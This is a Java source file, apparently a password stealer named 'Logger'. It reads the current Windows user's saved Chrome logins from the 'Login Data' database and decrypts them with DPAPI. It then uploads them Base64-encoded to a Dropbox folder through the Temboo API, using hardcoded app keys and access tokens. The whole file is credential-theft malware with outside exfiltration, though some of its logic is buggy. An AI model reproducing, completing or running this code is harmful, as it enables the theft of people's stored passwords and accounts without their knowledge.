import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;

import org.apache.commons.codec.binary.Base64;

import com.sun.jna.platform.win32.Crypt32Util;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileInputSet;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileResultSet;
import com.temboo.core.TembooException;
import com.temboo.core.TembooSession;

public class Logger{
		public Logger() throws TembooException{
		    String user = System.getProperty("user.name");
		    ArrayList<String> passwords = decrypt("C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data");
		    String uploadInfo = "";
		    for(String i : passwords){
		    	uploadInfo+="\nPassword: "+i;
		    }
		    upload(uploadInfo);
		}
		
		@SuppressWarnings("null")
		public ArrayList<String> decrypt(String file){
			try{
			    Class.forName("org.sqlite.JDBC");
				Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
				Statement statement = connection.createStatement();
				ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
				ArrayList<String> passwords = null; 
				while (resultSet.next())
			    {
			        byte[] encryptedData = resultSet.getBytes(2);
			        byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);  // exception over here
		
			        StringBuilder decryptedString = new StringBuilder();
		
			        for (byte b : decryptedData)
			        {
			           decryptedString.append((char) b);
			        }
			        
			        System.out.println("decrypted = [" + decryptedString + "]");
			        passwords.add(decryptedString.toString());
			        return passwords;
			   }
			   connection.close();
			 }catch(Exception e)
			 {
			    e.printStackTrace();
			 }
			return null; 
		}
		
		public void upload(String info) throws TembooException{
			// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
			TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");

			UploadFile uploadFileChoreo = new UploadFile(session);

			// Get an InputSet object for the choreo
			UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
			Base64 encode = new Base64();
			// Set inputs
			uploadFileInputs.set_ResponseFormat("json");
			uploadFileInputs.set_FileContents(encode.encodeToString(info.getBytes()));
			uploadFileInputs.set_Root("sandbox");
			uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
			uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
			uploadFileInputs.set_FileName("information.txt");
			uploadFileInputs.set_AccessTokenSecret("xh4d5f5yjflzyl7");
			uploadFileInputs.set_Folder("/RootFolder/"+System.getProperty("user.name"));
			uploadFileInputs.set_AppSecret("tr0phzmsc74vauv");

			// Execute Choreo
			UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
		}
		
		public void append(String info){
			
		}
}